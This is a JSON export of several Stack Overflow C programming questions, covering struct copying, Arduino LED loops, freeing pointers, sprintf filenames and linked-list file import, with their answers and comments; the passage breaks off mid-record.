"https://stackoverflow.com/users/4618203/yassine-bakkar"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1459341502, "post_id": 36308830, "comment_id": 60241432, "body": "@user3528438 done, thank you !"}], "answers": [{"comments": [{"owner": {"reputation": 97, "user_id": 4618203, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/5adcf59c370441c92b4809c25db5c902?s=128&d=identicon&r=PG&f=1", "display_name": "Yassine Bakkar", "link": "https://stackoverflow.com/users/4618203/yassine-bakkar"}, "edited": false, "score": 0, "creation_date": 1459341321, "post_id": 36308945, "comment_id": 60241301, "body": "no, my structure has non primitive members :/"}], "tags": [], "owner": {"reputation": 4352, "user_id": 2483038, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/cdaf35803110c235e3122cb85c113131?s=128&d=identicon&r=PG&f=1", "display_name": "blazs", "link": "https://stackoverflow.com/users/2483038/blazs"}, "is_accepted": true, "score": 1, "last_activity_date": 1459342704, "last_edit_date": 1495540787, "creation_date": 1459341050, "answer_id": 36308945, "question_id": 36308830, "link": "https://stackoverflow.com/questions/36308830/copying-a-complex-type-pointer-to-another-pointer-in-c/36308945#36308945", "title": "copying a complex type pointer to another pointer in C", "body": "<p>Yes, of course you can do that. Simply do member-wise copy. For primitive members use</p>\n\n<pre><code>graphe2-&gt;primitive_member = graphe1-&gt;primitive_member;\n</code></pre>\n\n<p>but be careful if you use non-primitive members or pointers. For non-primitive data types you may want to do deep copying (depending on how you use those data). See, for example, <a href=\"https://stackoverflow.com/questions/4931123/copying-one-structure-to-another\">Copying one struct to another</a>.</p>\n\n<p>We'll be able to give more concrete advice if you provide the definition of the data type.</p>\n"}], "owner": {"reputation": 97, "user_id": 4618203, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/5adcf59c370441c92b4809c25db5c902?s=128&d=identicon&r=PG&f=1", "display_name": "Yassine Bakkar", "link": "https://stackoverflow.com/users/4618203/yassine-bakkar"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 64, "favorite_count": 0, "closed_date": 1459378990, "accepted_answer_id": 36308945, "answer_count": 1, "score": -3, "last_activity_date": 1459342704, "creation_date": 1459340771, "last_edit_date": 1459341480, "question_id": 36308830, "link": "https://stackoverflow.com/questions/36308830/copying-a-complex-type-pointer-to-another-pointer-in-c", "closed_reason": "Needs details or clarity", "title": "copying a complex type pointer to another pointer in C", "body": "<p>I've a complex structure let's say: a graphe: grapheMAT</p>\n\n<p>I've: grapheMAT* graphe1; initialized by some datas... </p>\n\n<p>what I want is to copy graphe1 to another graphe2, and the modifications that I do on graphe2 won't affect graphe1 ! Can I do that ?</p>\n\n<p>EDIT: my structure has non primitive members to it. </p>\n"}, {"tags": ["c", "loops", "arduino"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 4, "creation_date": 1459340798, "post_id": 36308733, "comment_id": 60240867, "body": "please google for &quot;how to write a loop in c&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 2887, "user_id": 2422450, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65c899826b7012b67268ee1899b40419?s=128&d=identicon&r=PG", "display_name": "Lanting", "link": "https://stackoverflow.com/users/2422450/lanting"}, "is_accepted": false, "score": 0, "last_activity_date": 1459341645, "creation_date": 1459341645, "answer_id": 36309181, "question_id": 36308733, "link": "https://stackoverflow.com/questions/36308733/unable-to-blink-led-3-times-in-arduino-program/36309181#36309181", "title": "Unable to blink led 3 times in Arduino program", "body": "<p>The arduino loop loops forever.</p>\n\n<p><a href=\"https://www.arduino.cc/en/Reference/Loop\" rel=\"nofollow\">https://www.arduino.cc/en/Reference/Loop</a></p>\n\n<p>If you want to stop running that loop, you could put the arduino in sleep mode:</p>\n\n<p><a href=\"http://playground.arduino.cc/Learning/ArduinoSleepCode\" rel=\"nofollow\">http://playground.arduino.cc/Learning/ArduinoSleepCode</a></p>\n\n<p>I also recommend you have a thorough look at how flow control works (and possibly state machines). Have a look at chapter 5. Control Structures:</p>\n\n<p><a href=\"https://www.arduino.cc/en/Tutorial/BuiltInExamples\" rel=\"nofollow\">https://www.arduino.cc/en/Tutorial/BuiltInExamples</a></p>\n"}, {"tags": [], "owner": {"reputation": 54864, "user_id": 404970, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/o6X94.jpg?s=128&g=1", "display_name": "molbdnilo", "link": "https://stackoverflow.com/users/404970/molbdnilo"}, "is_accepted": false, "score": 0, "last_activity_date": 1459343401, "creation_date": 1459343401, "answer_id": 36309859, "question_id": 36308733, "link": "https://stackoverflow.com/questions/36308733/unable-to-blink-led-3-times-in-arduino-program/36309859#36309859", "title": "Unable to blink led 3 times in Arduino program", "body": "<p>If we \"unroll\" the <code>loop</code> function, we get:</p>\n\n<pre><code>// Loops is 1 on the first call.\ndigitalWrite(13, LOW);\nLoops = Loops + 1;\n// Loops is now 2\nif (Loops &lt; 3)\n{\n    // So, we enter here...\n    digitalWrite(13, HIGH);\n    delay(2000);  \n}\nelse\n{\n    // but not here\n    digitalWrite(13, LOW);      \n    exit(0);  \n}\n// Next call:\n// Turn off the light.\ndigitalWrite(13, LOW);\nLoops = Loops + 1;\n// Loops is now 3\nif (Loops &lt; 3)\n{\n    // So we don't enter here\n    digitalWrite(13, HIGH);\n    delay(2000);  \n}\nelse\n{\n    // but we enter here\n    digitalWrite(13, LOW);      \n    // Which exits\n    exit(0);  \n}\n</code></pre>\n\n<p>So you turn on the LED once, then turn it off and exit.<br>\nIf you adjust the loop counter, you will turn off the LED and then immediately turn it on again, which will just look like it's on for a longer period.</p>\n\n<p>You probably want to do a whole on/off cycle on each loop - something like this:</p>\n\n<pre><code>int LedPin = 13;\nint Loops = 0;\n\nvoid setup() {\n    pinMode(LedPin, OUTPUT);\n    digitalWrite(LedPin, LOW);\n}\n\nvoid loop() {\n    Loops = Loops + 1;\n    if (Loops &lt;= 3)\n    {\n        digitalWrite(LedPin, HIGH);\n        delay(2000);\n        digitalWrite(LedPin, LOW);\n        delay(2000);\n    }\n    else\n    {\n        exit(0);  \n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 135, "user_id": 5540037, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh6.googleusercontent.com/-Y1mOSmJagYs/AAAAAAAAAAI/AAAAAAAAAEQ/T0Uq1n_O3Qk/photo.jpg?sz=128", "display_name": "Krishna Mohan", "link": "https://stackoverflow.com/users/5540037/krishna-mohan"}, "is_accepted": false, "score": 0, "last_activity_date": 1459343454, "creation_date": 1459343454, "answer_id": 36309881, "question_id": 36308733, "link": "https://stackoverflow.com/questions/36308733/unable-to-blink-led-3-times-in-arduino-program/36309881#36309881", "title": "Unable to blink led 3 times in Arduino program", "body": "<pre><code>void setup() {\n  // initialize digital pin 13 as an output.\n\n\n  for (int i=0; i &lt; 4 ; i++) \n  {\n    pinMode(13, OUTPUT);\n    digitalWrite(13, HIGH); \n     delay(1000); \n     digitalWrite(13, LOW);    // turn the LED off by making the voltage LOW\n      delay(1000);    \n\n  }\n\n}\n\n// the loop function runs over and over again forever\nvoid loop() {\n\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 8492680, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-BQQ3E8QNHJ4/AAAAAAAAAAI/AAAAAAAACIE/RtqbSRz4P1s/photo.jpg?sz=128", "display_name": "Anirudh Ram", "link": "https://stackoverflow.com/users/8492680/anirudh-ram"}, "is_accepted": false, "score": -1, "last_activity_date": 1503281723, "creation_date": 1503281723, "answer_id": 45788535, "question_id": 36308733, "link": "https://stackoverflow.com/questions/36308733/unable-to-blink-led-3-times-in-arduino-program/45788535#45788535", "title": "Unable to blink led 3 times in Arduino program", "body": "<pre><code>int LedPin = 13;\n\nvoid setup() {\npinMode(LedPin, OUTPUT);\nfunction() ;       //call this function whatever you want\n}\n\nvoid function()\n{\ndigitalWrite(LedPin, HIGH);\ndelay(1000)       //add the desired delay\ndigitalWrite(LedPin, LOW);\ndelay(1000)     //add the desired delay\ndigitalWrite(LedPin, HIGH);\ndelay(1000)       //add the desired delay\ndigitalWrite(LedPin, LOW);\ndelay(1000)     //add the desired delay\ndigitalWrite(LedPin, HIGH);\ndelay(1000)       //add the desired delay\ndigitalWrite(LedPin, LOW);\ndelay(1000)     //add the desired delay\n\n}\n</code></pre>\n"}], "owner": {"reputation": 135, "user_id": 5540037, "user_type": "registered", "accept_rate": 33, "profile_image": "https://lh6.googleusercontent.com/-Y1mOSmJagYs/AAAAAAAAAAI/AAAAAAAAAEQ/T0Uq1n_O3Qk/photo.jpg?sz=128", "display_name": "Krishna Mohan", "link": "https://stackoverflow.com/users/5540037/krishna-mohan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 2358, "favorite_count": 0, "answer_count": 4, "score": -4, "last_activity_date": 1503281723, "creation_date": 1459340484, "last_edit_date": 1459342225, "question_id": 36308733, "link": "https://stackoverflow.com/questions/36308733/unable-to-blink-led-3-times-in-arduino-program", "title": "Unable to blink led 3 times in Arduino program", "body": "<p>I want to run the loop for three times to blink the led 3 times in Arduino program. How to run the loop for 3 times and exit from the loop.how to use return statement in loop? once led is getting on  for 1 sec and then getting off.</p>\n\n<pre><code>int LedPin = 13;\nint Loops = 1;\nvoid setup() {\n\n  pinMode(LedPin, OUTPUT);\n}\n\nvoid loop() {\ndigitalWrite(13, LOW);\nLoops = Loops + 1;\n  if    ( Loops &lt; 3 )\n\n  {\n      digitalWrite(13, HIGH);\n      delay(2000);  \n    }\n\n else  {\n  digitalWrite(13, LOW);      \n  exit(0);  \n  }\n}\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers"], "answers": [{"comments": [{"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 1, "creation_date": 1459340624, "post_id": 36308726, "comment_id": 60240724, "body": "While learning C it is always a good idea to enable warnings <code>-Wall -Wextra</code>. It prevents a lot of errors."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "edited": false, "score": 0, "creation_date": 1459340682, "post_id": 36308726, "comment_id": 60240772, "body": "Yes and maybe also <code>-pedantic</code>"}, {"owner": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "edited": false, "score": 0, "creation_date": 1459341418, "post_id": 36308726, "comment_id": 60241374, "body": "@terence hill Hi,could you help me out of the confusing:after I malloc pointer s sizeof 15,I strcpy a length of 11 to it.what about the left memory unused?"}, {"owner": {"reputation": 66473, "user_id": 694576, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/PpOGj.jpg?s=128&g=1", "display_name": "alk", "link": "https://stackoverflow.com/users/694576/alk"}, "edited": false, "score": 0, "creation_date": 1459341968, "post_id": 36308726, "comment_id": 60241790, "body": "... and <code>-Wconversion</code>!"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "edited": false, "score": 0, "creation_date": 1459342130, "post_id": 36308726, "comment_id": 60241915, "body": "@Hhdzhu The memory left is still there, nothing happens to that memory."}, {"owner": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "edited": false, "score": 0, "creation_date": 1459342558, "post_id": 36308726, "comment_id": 60242227, "body": "@terence hill excuse me,could you do me a favor once more?why after malloc s of size 15,the strlen of s is 0? and is there a good way to find some pointer unfreed? If I assigning s to t after allocating memory for s,I can actually free that memory by free t,I am not sure about this,because they are two different pointers...."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "edited": false, "score": 0, "creation_date": 1459343495, "post_id": 36308726, "comment_id": 60243043, "body": "@Hhdzhu <code>strlen</code> counts the elements before the terminating character <code>\\0</code>. The value of the terminating character is <code>0</code> so that strlen actually stops when reads a zero. This means that the first two calls to strlen in your code are meaningless. You cannot count the elements in a newly allocated string, you have to check the return value of malloc. The elements in a zeroed strings are zero. (See this for the terminating char: <a href=\"http://stackoverflow.com/questions/16955936/string-termination-char-c-0-vs-char-c-0\" title=\"string termination char c 0 vs char c 0\">stackoverflow.com/questions/16955936/&hellip;</a>)"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "reply_to_user": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "edited": false, "score": 0, "creation_date": 1459343633, "post_id": 36308726, "comment_id": 60243159, "body": "@Hhdzhu. If you assign <code>s</code>to <code>t</code> then <code>t</code>points to the same memory as <code>s</code>. If you free <code>t</code>you are actually freeing the memory pointed by both <code>t</code>and <code>s</code>."}], "tags": [], "owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "is_accepted": true, "score": 3, "last_activity_date": 1459343824, "last_edit_date": 1459343824, "creation_date": 1459340462, "answer_id": 36308726, "question_id": 36308496, "link": "https://stackoverflow.com/questions/36308496/c-language-how-i-free-a-pointer-after-i-move-it/36308726#36308726", "title": "c language How I free a pointer after I move it", "body": "<p>The main problem is that you are assigning <code>s</code> to <code>t</code> before allocating memory for <code>s</code>:</p>\n\n<pre><code>char *t = s;\n</code></pre>\n\n<p>and then you try to free <code>t</code> which point to an <em>un-initialised</em> memory.</p>\n\n<p>If you compile your code with <code>-Wall</code> you will get a warning.</p>\n\n<p>You should set <code>t = s</code> after the memory allocation of <code>s</code>.</p>\n\n<p>Also, always check the return value of malloc (there is no need to cast it): </p>\n\n<pre><code>s = malloc(sizeof(char)*15);\nif (s == NULL) {\n   // Error!\n   return 1\n}\n</code></pre>\n"}], "owner": {"reputation": 39, "user_id": 4757257, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3fa0d73fbe16c03ae2a85db5d83f2891?s=128&d=identicon&r=PG&f=1", "display_name": "Hhdzhu", "link": "https://stackoverflow.com/users/4757257/hhdzhu"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 176, "favorite_count": 0, "accepted_answer_id": 36308726, "answer_count": 1, "score": -3, "last_activity_date": 1459343824, "creation_date": 1459339877, "question_id": 36308496, "link": "https://stackoverflow.com/questions/36308496/c-language-how-i-free-a-pointer-after-i-move-it", "title": "c language How I free a pointer after I move it", "body": "<p>what I wanna to do is get space separated words into a 2d array.what I am thinking is replace space by a '\\0',so I can copy the string to array.And then add the string pointer to the place after '\\0'.keeping do it till the last.But when I done it ,I consider how can I free the pointer.I consider maybe I can save it first so I use char *t = s.But when I free the t I get a segment error.so how should i free the s pointer after it move to another place.\nbeside this,I also have some questions:\n<strong>1.after I malloc a sizeof(char)*15 memory ,I expect printf strlen(s) I can print 15,but I get 0,why?If I wanna know the size of s now,how should I do?</strong>\n<em>2.after strcpy str to s,the strlen s become 11.But I malloc size of 15,where will the left memory go? does that effect program?</em></p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(){\n\n    char buf[10][5];\n    char *str = \"10 8 6 9 76\";\n    char *s;\n    char *t = s;\n\n    s = (char *)malloc(sizeof(char)*15);\n    printf(\"strlen 1 s:%d\\n\",strlen(s));\n\n    memset(s,0x00,sizeof(char)*15);\n    printf(\"strlen 2 s:%d\\n\",strlen(s));\n\n    strcpy(s,str);\n\n    int n = strlen(s);\n    int i = 0;\n    int j = 0;\n    int k = 0;\n\n\n    for( i = 0; i &lt; n; i++ ){\n        if( s[i] == ' '){\n            s[i] = '\\0';\n            strcpy( buf[k], s);\n            s += (i+1);\n            k++;\n            n = n - i - 1;\n            i = 0;\n        }\n    }\n    printf(\"s:%s\\n\",s);\n    strcpy( buf[k], s );\n\n\n    for( j = 0; j&lt;= k; j++ ){\n        printf(\"buf[%d]:[%s]\\n\",j,buf[j]);\n    }\n    printf(\"j:%d\\n\",j);\n\n    free(t);\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "csv"], "comments": [{"owner": {"reputation": 11220, "user_id": 2609288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3634e5c231c72e362f00ae39b637734f?s=128&d=identicon&r=PG", "display_name": "Baldrick", "link": "https://stackoverflow.com/users/2609288/baldrick"}, "edited": false, "score": 0, "creation_date": 1459339473, "post_id": 36308254, "comment_id": 60239949, "body": "Use <code>sprintf</code> to write to a buffer first (using the %d syntax above), then pass the buffer into <code>TG_SetDataLog</code>."}], "answers": [{"tags": [], "owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "is_accepted": true, "score": 2, "last_activity_date": 1459339547, "creation_date": 1459339547, "answer_id": 36308364, "question_id": 36308254, "link": "https://stackoverflow.com/questions/36308254/how-to-add-a-variable-integer-to-filename-of-csv-in-c/36308364#36308364", "title": "How to add a variable integer to filename of csv in c", "body": "<pre><code>char buff[64];\n\nsprintf(buff, \"dataLog%d.csv\", i);\nerrCode = TG_SetDataLog(connectionId, buff);\n</code></pre>\n\n<p><code>sprintf</code> (or <code>snprintf</code> that is better because secure) is like printf, but write in a buffer, not on the standard output.</p>\n"}, {"tags": [], "owner": {"reputation": 11220, "user_id": 2609288, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3634e5c231c72e362f00ae39b637734f?s=128&d=identicon&r=PG", "display_name": "Baldrick", "link": "https://stackoverflow.com/users/2609288/baldrick"}, "is_accepted": false, "score": 0, "last_activity_date": 1459339621, "creation_date": 1459339621, "answer_id": 36308397, "question_id": 36308254, "link": "https://stackoverflow.com/questions/36308254/how-to-add-a-variable-integer-to-filename-of-csv-in-c/36308397#36308397", "title": "How to add a variable integer to filename of csv in c", "body": "<p><code>TG_SetDataLog</code> is not a variadic function which supports the <code>printf</code> %d syntax.</p>\n\n<p>You need to do it in two steps, as follows:</p>\n\n<pre><code>char buffer[32]; \nsprintf(buffer,\"dataLog%d.csv\",i); \nerrCode = TG_SetDataLog(connectionId, buffer);\n</code></pre>\n"}], "owner": {"reputation": 27, "user_id": 6097649, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d14aba4c162d4e5d3f1579b3f6ad4ef?s=128&d=identicon&r=PG&f=1", "display_name": "A. Pipi", "link": "https://stackoverflow.com/users/6097649/a-pipi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 113, "favorite_count": 0, "accepted_answer_id": 36308364, "answer_count": 2, "score": 0, "last_activity_date": 1489099343, "creation_date": 1459339274, "last_edit_date": 1489099343, "question_id": 36308254, "link": "https://stackoverflow.com/questions/36308254/how-to-add-a-variable-integer-to-filename-of-csv-in-c", "title": "How to add a variable integer to filename of csv in c", "body": "<p>I want to add a variable integer into the filename of a csv in the C-language. I am using this line of code to do that:</p>\n\n<pre><code>errCode = TG_SetDataLog(connectionId, \"dataLog%d.csv\", i);\n</code></pre>\n\n<p>If the <code>errCode = 0</code>, than the function <code>TG_SetDataLog</code> will write data to a csv. I thougt i could add a variable by using <code>%d</code> and put the variable behind the comma, but this does not work. The following information is what i can get about the <code>TG_SetDataLog</code> function.</p>\n\n<p><img src=\"https://i.stack.imgur.com/K4oFW.png\" alt=\"enter image description here\"></p>\n\n<p>If someone could help me it would be really helpfull.</p>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 9846, "user_id": 1745544, "user_type": "registered", "accept_rate": 23, "profile_image": "https://www.gravatar.com/avatar/92a0f69d86d214e0cffceb76c6e3f09f?s=128&d=identicon&r=PG", "display_name": "OldProgrammer", "link": "https://stackoverflow.com/users/1745544/oldprogrammer"}, "edited": false, "score": 1, "creation_date": 1459339214, "post_id": 36308197, "comment_id": 60239791, "body": "Well, did you step through the code in a debugger?  Please show definition of nodeList."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1459339732, "post_id": 36308197, "comment_id": 60240138, "body": "1) there is no reason for this function to return void. 2) <code>while (!feof()) {}</code> is always wrong. 3) you are malloccing an element before you kwow that you&#39;ll need it. 4) don&#39;t cast the return value from malloc() 5) check the return values of fscanf() and fgets()"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1459339761, "post_id": 36308197, "comment_id": 60240161, "body": "<a href=\"http://stackoverflow.com/questions/5431941/why-is-while-feof-file-always-wrong\">Read this first</a>. <a href=\"http://stackoverflow.com/questions/5810410/alternative-for-fflushstdin\">Read this next</a>. <a href=\"http://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\">Furthermore read this</a>."}], "answers": [{"comments": [{"owner": {"reputation": 4586, "user_id": 1507014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ca563ac151770f5ae24c741970401c81?s=128&d=identicon&r=PG", "display_name": "Bentoy13", "link": "https://stackoverflow.com/users/1507014/bentoy13"}, "reply_to_user": {"reputation": 1, "user_id": 5640492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b490fd97cc6af097d47fab75e2547ea0?s=128&d=identicon&r=PG&f=1", "display_name": "M.V.", "link": "https://stackoverflow.com/users/5640492/m-v"}, "edited": false, "score": 0, "creation_date": 1459350078, "post_id": 36308366, "comment_id": 60248538, "body": "In addition to this, I strongly advise to apply the comments of n.m. and wildpasser, there are good pratices to make a safe code."}], "tags": [], "owner": {"reputation": 4586, "user_id": 1507014, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/ca563ac151770f5ae24c741970401c81?s=128&d=identicon&r=PG", "display_name": "Bentoy13", "link": "https://stackoverflow.com/users/1507014/bentoy13"}, "is_accepted": false, "score": 0, "last_activity_date": 1459339552, "creation_date": 1459339552, "answer_id": 36308366, "question_id": 36308197, "link": "https://stackoverflow.com/questions/36308197/how-to-get-data-read-into-linked-list-from-text-file-in-c/36308366#36308366", "title": "How to get data read into linked list from text file in C", "body": "<p>There is an error near the beginning: you are losing the memory allocated first into <code>temp</code> since you are replacing <code>temp</code> with <code>*head</code>. If <code>*head</code> is null when you call this function, you get an exception when you dereference the pointer. Maybe you want to do <code>*head = temp;</code> instead, to get the head of your list back?</p>\n"}], "owner": {"reputation": 1, "user_id": 5640492, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b490fd97cc6af097d47fab75e2547ea0?s=128&d=identicon&r=PG&f=1", "display_name": "M.V.", "link": "https://stackoverflow.com/users/5640492/m-v"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1075, "favorite_count": 1, "answer_count": 1, "score": 0, "last_activity_date": 1459339552, "creation_date": 1459339151, "last_edit_date": 1459339268, "question_id": 36308197, "link": "https://stackoverflow.com/questions/36308197/how-to-get-data-read-into-linked-list-from-text-file-in-c", "title": "How to get data read into linked list from text file in C", "body": "<p>I'm pretty new to C programming and I am trying to build a console application that takes in some user survey data into a singly linked list and generates statistics out of it.  </p>\n\n<p>The main idea is that every time application user opens up the application, the existing survey data is loaded from text file into linked list nodes. User can then manipulate data as they want.</p>\n\n<p>My issue is that application crashes every time the importList function is called and I can't figure out where my issue is. I would be really grateful if anyone can point out where my mistake is. Thank you.</p>\n\n<p>Here is the function for importing data from text file:</p>\n\n<pre><code>void importList(struct nodeList** head)\n{\n\n    //set up the linked list node by node\n    struct nodeList *temp;\n    temp =(struct nodeList*)malloc(sizeof(struct nodeList));\n    temp = *head;\n\n    //open survey data file in read mode to import existing survey data\n    openSurveyFile();\n\n    //read in data that's in the text file to nodes in linked list\n    while(!feof(surFPtr))\n    {\n        //import data from file. All data except address is held in single word lines.\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;PPS);\n        fscanf(surFPtr, \"%s\", temp-&gt;name);\n        fscanf(surFPtr, \"%s\", temp-&gt;surname);\n        fgets(temp-&gt;address, 50, surFPtr);//since address is a multiword string the list needs to read the entire line\n        fscanf(surFPtr, \"%s\", temp-&gt;eMail);\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;age);\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;income);\n        fscanf(surFPtr, \"%s\", temp-&gt;gender);\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;exercise);\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;alcohol);\n        fscanf(surFPtr, \"%d\", &amp;temp-&gt;smoking);\n        fflush(stdin);\n\n        //allocate memory for the next node in list\n        temp-&gt;next =(struct nodeList*)malloc(sizeof(struct nodeList));\n        temp = temp-&gt;next;//move on to next node\n    }\n    //close survey data file once all data is imported\n    closeSurveyFile();\n}//end of importList function\n</code></pre>\n"}, {"tags": ["c", "arrays", "pointers"], "comments": [{"owner": {"reputation": 26583, "user_id": 1441, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/fb7f1cd450084fdb4bfc9376c7dba2a7?s=128&d=identicon&r=PG", "display_name": "crashmstr", "link": "https://stackoverflow.com/users/1441/crashmstr"}, "edited": false, "score": 1, "creation_date": 1459338614, "post_id": 36307817, "comment_id": 60239351, "body": "You are compiling C++ (and including C++ headers). If you really want to learn C then compile C (the languages are <i>very</i> different in many ways)."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1459338788, "post_id": 36307817, "comment_id": 60239487, "body": "Use <code>%p</code> instead of <code>%x</code> for printing pointer values. Using <code>%x</code> is undefined behaviour on many platforms."}, {"owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "edited": false, "score": 1, "creation_date": 1459338831, "post_id": 36307817, "comment_id": 60239521, "body": "Why don&#39;t you print and analyze <code>printf(&quot;%d printing from==&gt;%p\\n&quot;,a[i][j],(void *)&amp;a[i][j]);</code>?"}, {"owner": {"reputation": 9530, "user_id": 5264491, "user_type": "registered", 